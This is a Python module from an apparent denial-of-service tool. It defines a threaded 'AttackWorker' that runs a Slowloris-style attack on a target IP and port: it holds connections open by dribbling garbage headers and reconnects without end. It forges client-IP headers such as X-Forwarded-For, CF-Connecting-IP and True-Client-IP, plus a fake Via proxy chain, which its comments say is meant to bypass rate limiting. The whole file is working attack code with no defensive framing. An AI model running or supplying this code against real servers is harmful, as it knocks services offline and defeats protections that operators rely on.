#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attack Worker - Individual thread attack logic
"""

import socket
import random
import time
import logging
from typing import Optional

from .statistics import AttackStatistics
from .ip_generator import IPGenerator
from ..config import USER_AGENTS, DEFAULT_TIMEOUT, DEFAULT_KEEP_ALIVE_INTERVAL

class AttackWorker:
    """Worker class để thực hiện attack từ mỗi thread"""
    
    def __init__(
        self, 
        target_ip: str, 
        target_port: int, 
        stats: AttackStatistics, 
        worker_id: int, 
        use_spoofing: bool = True, 
        timeout: int = DEFAULT_TIMEOUT, 
        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL
    ):
        """
        Initialize attack worker
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            stats: Statistics tracker instance
            worker_id: Unique worker ID
            use_spoofing: Enable IP spoofing
            timeout: Socket timeout
            keep_alive_interval: Interval between garbage headers
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.stats = stats
        self.worker_id = worker_id
        self.use_spoofing = use_spoofing
        self.timeout = timeout
        self.keep_alive_interval = keep_alive_interval
        self.running = True
        
    def stop(self):
        """Dừng worker"""
        self.running = False
        
    def build_http_request(self, spoofed_ip: Optional[str]) -> str:
        """
        Xây dựng HTTP request với đầy đủ bypass headers
        
        Args:
            spoofed_ip: IP to spoof (None if spoofing disabled)
            
        Returns:
            Complete HTTP request string
        """
        rand_param = random.randint(1, 999999)
        user_agent = random.choice(USER_AGENTS)
        
        # Base request
        request = (
            f"GET /?storm={rand_param} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        # Thêm spoofing headers nếu được bật
        if self.use_spoofing and spoofed_ip:
            # Các header phổ biến để bypass rate limiting
            request += (
                f"X-Forwarded-For: {spoofed_ip}\r\n"      # Nginx, Apache
                f"X-Real-IP: {spoofed_ip}\r\n"            # Nginx
                f"X-Client-IP: {spoofed_ip}\r\n"          # Generic
                f"X-Originating-IP: {spoofed_ip}\r\n"    # Some proxies
                f"Client-IP: {spoofed_ip}\r\n"            # IIS
                f"True-Client-IP: {spoofed_ip}\r\n"       # Cloudflare
                f"CF-Connecting-IP: {spoofed_ip}\r\n"    # Cloudflare
                f"X-ProxyUser-IP: {spoofed_ip}\r\n"       # Generic proxy
            )
            
            # Via header với proxy chain giả
            via_chain = IPGenerator.generate_proxy_chain()
            request += f"Via: {via_chain}\r\n"
        
        # Standard headers
        request += (
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
            f"Cache-Control: max-age=0\r\n"
        )
        
        return request
        
    def run(self):
        """Main worker loop - Slowloris style attack với IP spoofing"""
        while self.running:
            sock = None
            spoofed_ip = None
            
            try:
                # Generate spoofed IP
                if self.use_spoofing:
                    spoofed_ip = IPGenerator.generate_public_ip()
                
                # Tạo socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target_ip, self.target_port))
                
                self.stats.connection_established(spoofed_ip)
                logging.debug(f"Worker {self.worker_id}: Connected with IP {spoofed_ip}")
                
                # Gửi HTTP request với spoofing headers
                http_request = self.build_http_request(spoofed_ip)
                sock.send(http_request.encode('utf-8'))
                self.stats.packet_sent()
                
                # Keep-alive loop: liên tục gửi garbage headers
                while self.running:
                    time.sleep(self.keep_alive_interval)
                    
                    # Gửi garbage header để giữ connection alive
                    garbage_header = f"X-Phantom-{random.randint(1,9999)}: {random.randint(1,99999)}\r\n"
                    sock.send(garbage_header.encode('utf-8'))
                    self.stats.packet_sent()
                    
            except socket.timeout:
                self.stats.connection_failed("timeout")
                logging.debug(f"Worker {self.worker_id}: Connection timeout")
                
            except socket.error as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.debug(f"Worker {self.worker_id}: Socket error - {error_type}")
                
            except Exception as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.error(f"Worker {self.worker_id}: Unexpected error - {e}")
                
            finally:
                # Cleanup
                if sock:
                    try:
                        sock.close()
                        self.stats.connection_closed()
                    except:
                        pass
                
                # Delay trước khi reconnect
                if self.running:
                    time.sleep(0.5)
